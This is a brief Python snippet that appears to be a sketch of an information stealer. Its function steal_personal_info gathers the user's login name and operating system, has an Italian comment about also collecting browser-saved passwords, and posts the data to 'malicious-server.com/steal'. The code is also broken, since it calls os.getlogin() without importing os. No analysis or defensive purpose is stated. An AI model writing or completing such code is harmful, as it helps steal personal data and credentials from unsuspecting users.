import requests
import platform

def steal_personal_info():
    user_info = {
        "username": os.getlogin(),
        "platform": platform.system(),
        # Altro codice per raccogliere informazioni sensibili, come le password memorizzate nel browser
    }
    # Invia le informazioni rubate a un server remoto
    requests.post("http://malicious-server.com/steal", data=user_info)
